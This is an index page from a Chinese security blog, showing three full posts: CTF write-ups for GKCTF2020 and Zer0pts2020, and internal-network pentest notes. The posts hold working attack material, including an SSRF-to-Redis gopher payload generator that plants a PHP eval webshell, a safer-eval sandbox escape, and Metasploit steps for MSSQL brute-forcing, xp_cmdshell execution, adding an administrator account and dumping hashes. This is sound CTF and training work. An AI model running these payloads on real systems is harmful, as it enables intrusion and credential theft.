<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"www.plasf.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="随笔、分享、记录生活">
<meta name="keywords" content="CTF|网络安全|开发">
<meta property="og:type" content="website">
<meta property="og:title" content="Xiao Leung&#39;s Blog">
<meta property="og:url" content="https://www.plasf.cn/page/3/index.html">
<meta property="og:site_name" content="Xiao Leung&#39;s Blog">
<meta property="og:description" content="随笔、分享、记录生活">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Xiao Leung&#39;s Blog">
<meta name="twitter:description" content="随笔、分享、记录生活">

<link rel="canonical" href="https://www.plasf.cn/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Xiao Leung's Blog</title>
  


  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?9905f6cfc84bbdd051e0d6a5e5f8714a";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Xiao Leung's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">专注网络安全研究</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-sitemap">

    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5c12b792b.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d5c12b792b.html" class="post-title-link" itemprop="url">GKCTF2020-CheckIN</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-05-27 16:21:20" itemprop="dateCreated datePublished" datetime="2020-05-27T16:21:20+08:00">2020-05-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:24:56" itemprop="dateModified" datetime="2020-10-14T17:24:56+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>4.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>base64加密一下可以直接RCE：</p>
<pre><code>?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==</code></pre><p>测试发现<code>tmp</code>目录是可以写东西。但是直接读flag是没法读得。但是发现有readflag这个程序在根目录，但是这里把执行系统命令的函数都给禁了，这里要bypass 一下<code>disable function</code>.</p>
<p>直接exp一把梭：</p>
<p><a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p>
<p>exp上传到/var/tmp/3.txt,直接包含执行就行了。</p>
<pre><code>http://ebd8d9e8-ee16-4153-8396-b65d3b3b95ac.node3.buuoj.cn/?Ginkgo=ZXZhbCgkX0dFVFsnYSddKTs=&amp;a=var_dump(include(&#39;../../tmp/3.txt&#39;));</code></pre><blockquote>
<p> echo pwn(“echo <code>/readflag</code> &gt; /var/tmp/a.txt”);</p>
</blockquote>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200526145744.png" alt="微信图片_20200526145744"></p>
<h2 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h2><p>直接网上搜shopX0 getshell <a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">http://www.nctry.com/1660.html</a></p>
<p>那道shell之后呢，发现根目录下的flag是假的，还有个hint。不知道这个hint有啥用，但是在auto.sh有一个很明显的地方</p>
<pre><code>#!/bin/sh
while true; do (python /var/mail/makeflaghint.py &amp;) &amp;&amp; sleep 60; done</code></pre><p>这里应该设定了定时任务每60秒执行一次这个脚本，而且这个makeflaghint.py 脚本我们有权限修改。我们直接修改脚本就能读到/root/flag。</p>
<pre><code class="python">f = open(&#39;/root/flag&#39;,&#39;r&#39;)
f2 = open(&#39;/666.txt&#39;,&#39;w&#39;)
flag = f.read()
f2.write(flag)
f.close()
f2.close()</code></pre>
<h2 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a>EZ三剑客-EzWeb</h2><p>这道题和安恒还是广东强网某道题基本一样。也是SSRF打Redis.</p>
<p>SSRF对内网IP进行探测然后对端口探测发现是Redis，然后EXP一把梭。</p>
<pre><code class="python">import urllib
import urllib.parse
protocol=&quot;gopher://&quot;
ip=&quot;173.138.94.11&quot;
port=&quot;6379&quot;
shell=&#39;\n\n&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;\n\n&#39;
filename=&quot;shell.php&quot;
path=&quot;/var/www/html&quot;
passwd=&quot;&quot;
cmd=[&quot;flushall&quot;,
     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),
     &quot;config set dir {}&quot;.format(path),
     &quot;config set dbfilename {}&quot;.format(filename),
     &quot;save&quot;
     ]
if passwd:
    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
def redis_format(arr):
    CRLF=&quot;\r\n&quot;
    redis_arr = arr.split(&quot; &quot;)
    cmd=&quot;&quot;
    cmd+=&quot;*&quot;+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
    cmd+=CRLF
    return cmd

if __name__==&quot;__main__&quot;:
    for x in cmd:
        payload += urllib.parse.quote(redis_format(x))
    print(payload)</code></pre>
<pre><code>gopher://173.138.94.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</code></pre><p>最后读flag需要绕一下空格。</p>
<h2 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a>cve版签到</h2><pre><code>?url=http://127.0.0.123%00.ctfhub.com</code></pre><h2 id="EZ三剑客-EzNode"><a href="#EZ三剑客-EzNode" class="headerlink" title="EZ三剑客-EzNode"></a>EZ三剑客-EzNode</h2><pre><code class="javascript">const express = require(&#39;express&#39;);
const bodyParser = require(&#39;body-parser&#39;);

const saferEval = require(&#39;safer-eval&#39;); // 2019.7/WORKER1 找到一个很棒的库

const fs = require(&#39;fs&#39;);

const app = express();


app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// 2020.1/WORKER2 老板说为了后期方便优化
app.use((req, res, next) =&gt; {
  if (req.path === &#39;/eval&#39;) {
    let delay = 60 * 1000;
    console.log(delay);
    if (Number.isInteger(parseInt(req.query.delay))) {
      delay = Math.max(delay, parseInt(req.query.delay));
    }
    const t = setTimeout(() =&gt; next(), delay);
    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
    setTimeout(() =&gt; {
      clearTimeout(t);
      console.log(&#39;timeout&#39;);
      try {
        res.send(&#39;Timeout!&#39;);
      } catch (e) {

      }
    }, 1000);
  } else {
    next();
  }
});

app.post(&#39;/eval&#39;, function (req, res) {
  let response = &#39;&#39;;
  if (req.body.e) {
    try {
      response = saferEval(req.body.e);
    } catch (e) {
      response = &#39;Wrong Wrong Wrong!!!!&#39;;
    }
  }
  res.send(String(response));
});

// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get(&#39;/source&#39;, function (req, res) {
  res.set(&#39;Content-Type&#39;, &#39;text/javascript;charset=utf-8&#39;);
  res.send(fs.readFileSync(&#39;./index.js&#39;));
});

// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口
app.get(&#39;/version&#39;, function (req, res) {
  res.set(&#39;Content-Type&#39;, &#39;text/json;charset=utf-8&#39;);
  res.send(fs.readFileSync(&#39;./package.json&#39;));
});

app.get(&#39;/&#39;, function (req, res) {
  res.set(&#39;Content-Type&#39;, &#39;text/html;charset=utf-8&#39;);
  res.send(fs.readFileSync(&#39;./index.html&#39;))
})

app.listen(80, &#39;0.0.0.0&#39;, () =&gt; {
  console.log(&#39;Start listening&#39;)
});</code></pre>
<h4 id="小trick"><a href="#小trick" class="headerlink" title="小trick"></a>小trick</h4><ul>
<li><p>setTimeout ，整数溢出，Infinity或者 ⼤于 2147483647</p>
</li>
<li><p>safeval <a href="https://github.com/commenthol/safer-eval/issues/10" target="_blank" rel="noopener">https://github.com/commenthol/safer-eval/issues/10</a></p>
</li>
</ul>
<pre><code>setInterval.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString();</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200527142405.png" alt="微信截图_20200527142405"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d729d7601d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d729d7601d.html" class="post-title-link" itemprop="url">内网渗透学习笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-05-21 16:05:57" itemprop="dateCreated datePublished" datetime="2020-05-21T16:05:57+08:00">2020-05-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:25:37" itemprop="dateModified" datetime="2020-10-14T17:25:37+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本文将持续更新。系统记录内网渗透学习。</p>
<p><strong><em>声明：本文仅研究学习所用，参考文章的一切活动均与本人无关。</em></strong></p>
<h2 id="内网服务探测"><a href="#内网服务探测" class="headerlink" title="内网服务探测"></a>内网服务探测</h2><h3 id="Netdiscover-探测活动主机"><a href="#Netdiscover-探测活动主机" class="headerlink" title="Netdiscover 探测活动主机"></a>Netdiscover 探测活动主机</h3><ul>
<li>简介</li>
</ul>
<blockquote>
<p>专用的二层发现工具。拥有主动和被动发现两种方式。</p>
</blockquote>
<ul>
<li>参数</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>-i 网卡</td>
<td>指定监听的网卡</td>
</tr>
<tr>
<td>-r range</td>
<td>指定IP段</td>
</tr>
<tr>
<td>-l filename</td>
<td>从文件中读取IP段</td>
</tr>
<tr>
<td>-p</td>
<td>被动模式</td>
</tr>
<tr>
<td>-t</td>
<td>ARP发送间隔</td>
</tr>
<tr>
<td>-c</td>
<td>发包数量</td>
</tr>
</tbody></table>
<ul>
<li>使用举例</li>
</ul>
<pre><code class="shell">netdiscover i eth0 -r 192.168.3.0/24 #主动探测IP：192.168.3.0/24段存活的主机
netdiscover -p</code></pre>
<h3 id="使用Namp探测主机开放服务"><a href="#使用Namp探测主机开放服务" class="headerlink" title="使用Namp探测主机开放服务"></a>使用Namp探测主机开放服务</h3><p>由于已经使用<code>netdiscover</code>探测指定主机的使用Pn参数跳过Pn检测。具体使用参数说明在另一篇文章里讲.</p>
<pre><code class="shell">nmap -sV -Pn 192.168.3.31</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/20200521142828.png" alt="20200521142828"></p>
<h2 id="MSF攻击内网服务"><a href="#MSF攻击内网服务" class="headerlink" title="MSF攻击内网服务"></a>MSF攻击内网服务</h2><h3 id="MSF攻击内网SQL-SERVER服务"><a href="#MSF攻击内网SQL-SERVER服务" class="headerlink" title="MSF攻击内网SQL SERVER服务"></a>MSF攻击内网SQL SERVER服务</h3><h4 id="爆破Mssql弱口令"><a href="#爆破Mssql弱口令" class="headerlink" title="爆破Mssql弱口令"></a>爆破Mssql弱口令</h4><ul>
<li>搜索mssql爆破payload</li>
</ul>
<pre><code>search mssql_login</code></pre><ul>
<li>使用弱口令爆破payload</li>
</ul>
<pre><code class="shell">use auxiliary/scanner/mssql/mssql_login
set rhosts 192.168.3.31
run</code></pre>
<ul>
<li>如果提示:</li>
</ul>
<blockquote>
<p>[*] Error: 192.168.109.139: Metasploit::Framework::LoginScanner::Invalid Cred details can’t be blank, Cred details can’t be blank (Metasploit::Framework::LoginScanner::MSSQL)</p>
</blockquote>
<p>则说明mssql不是默认密码需要指定字典进行爆破：</p>
<pre><code class="shell">use auxiliary/scanner/mssql/mssql_login
set rhosts 192.168.3.31
set user_file /root/user.txt
set pass_file /root/pass.txt
run</code></pre>
<ul>
<li>爆破成功sa密码为admin<br><img src="http://goodcheerleung.gitee.io/blog/20200521143926.png" alt="20200521143926"></li>
</ul>
<h4 id="枚举Mssql配置信息"><a href="#枚举Mssql配置信息" class="headerlink" title="枚举Mssql配置信息"></a>枚举Mssql配置信息</h4><ul>
<li>搜索枚举Mssql配置信息payload</li>
</ul>
<pre><code>search mssql_enum</code></pre><ul>
<li>使用Mssql-enum payload</li>
</ul>
<pre><code class="shell">use auxiliary/admin/mssql_enum
set username sa
set password admin
set rhosts 192.168.3.31
run</code></pre>
<ul>
<li>这样可以看到mssql开放的哪些功能能够供我们利用，例如比较重要的就是xp_cmdshell能够直接继承mssql的权限执行系统命令：</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/20200521145004.png" alt="20200521145004"></p>
<h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><h5 id="xp-cmdshell-执行命令"><a href="#xp-cmdshell-执行命令" class="headerlink" title="xp_cmdshell 执行命令"></a>xp_cmdshell 执行命令</h5><p>使用该模块时候如果<code>xp_cmdshell</code>没有启动将自动激活</p>
<ul>
<li>搜索mssql exec攻击脚本</li>
</ul>
<pre><code>search mssql_exec</code></pre><ul>
<li>使用mssql_exec攻击脚本</li>
</ul>
<pre><code>use auxiliary/admin/mssql_exec
set username sa
set password admin
set rhosts 192.168.3.31
set cmd chcp 65001&amp;whoami
run</code></pre><ul>
<li>注意chcp 65001改变字符编码解决乱码问题，可以看到返回结果是system，直接添加新用户即可。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/20200521145639.png" alt="20200521145639"></p>
<ul>
<li>增加用户</li>
</ul>
<pre><code class="shell">set cmd chcp 65001&amp;net user test abc!123456 /add
run</code></pre>
<ul>
<li>提升权限</li>
</ul>
<pre><code class="shell">set cmd chcp 65001&amp;net localgroup administrators test /add</code></pre>
<h4 id="使用mssql-hashdump-抓取hash"><a href="#使用mssql-hashdump-抓取hash" class="headerlink" title="使用mssql_hashdump 抓取hash"></a>使用mssql_hashdump 抓取hash</h4><pre><code>use auxiliary/scanner/mssql/mssql_hashdump  
set rhosts 192.168.3.30
set password admin
set username sa
run</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200521224308.png" alt="20200521224308"></p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200521224355.png" alt="20200521224355"></p>
<h4 id="执行sql语句"><a href="#执行sql语句" class="headerlink" title="执行sql语句"></a>执行sql语句</h4><pre><code>use auxiliary/admin/mssql/mssql_sql
set rhosts 192.168.3.30
set password admin
set username sa
set sql set sql Select Name FROM Master.dbo.SysDatabases orDER BY Name
run </code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200521230010.png" alt="20200521230010"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d4f73bcb62.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d4f73bcb62.html" class="post-title-link" itemprop="url">Zer0pts2020-Can you guess it?</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-05-20 15:56:40" itemprop="dateCreated datePublished" datetime="2020-05-20T15:56:40+08:00">2020-05-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:25:58" itemprop="dateModified" datetime="2020-10-14T17:25:58+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><pre><code class="php">&lt;?php
include &#39;config.php&#39;; // FLAG is defined in config.php

if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) {
  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);
}

if (isset($_GET[&#39;source&#39;])) {
  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST[&#39;guess&#39;])) {
  $guess = (string) $_POST[&#39;guess&#39;];
  if (hash_equals($secret, $guess)) {
    $message = &#39;Congratulations! The flag is: &#39; . FLAG;
  } else {
    $message = &#39;Wrong.&#39;;
  }
}
?&gt;</code></pre>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从源码得知flag在config.php中的一个常量中，要得到flag需要我们post一个值guess和随机生成的要预测和爆破基本没戏。但是可以发现 <code>highlight_file()</code> 里面的变量是可控的。那么我们可以看看<code>basename($_SERVER[&#39;PHP_SELF&#39;])</code> 怎么才能得到我们想要的结果。我们从php.net可以得知：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200520150428.png" alt="微信图片_20200520150428"></p>
<p><code>$_SERVER[&#39;PHP_SELF&#39;]</code> 能够当前url的路径，而basename能够返回返回路径中文件名部分。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154155.png" alt="微信截图_20200520154155"></p>
<p>那我们不是可以传入<code>/index.php/config.php?souce</code> ？但是一条正则挡住了我们的去路：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154339.png" alt="微信截图_20200520154339"></p>
<h2 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h2><p>我们还需要绕过</p>
<pre><code class="php">preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])</code></pre>
<p>这种正则其实直接写个脚本去爆破即可，一般都是某个字符能够通过。</p>
<pre><code class="python">import requests

for i in range(0,255):
    url=&quot;http://c3bedc5a-4535-41a4-9c5f-9a25eae15489.node3.buuoj.cn/index.php/config.php/%s?source&quot;%(chr(i))
    r = requests.get(url)
    if &#39;flag&#39; in r.text:
        print(r.text)
</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154931.png" alt="微信截图_20200520154931"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5850ed2ae.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d5850ed2ae.html" class="post-title-link" itemprop="url">Hard_Pentest_1 复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-05-08 23:19:35" itemprop="dateCreated datePublished" datetime="2020-05-08T23:19:35+08:00">2020-05-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:26:15" itemprop="dateModified" datetime="2020-10-14T17:26:15+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
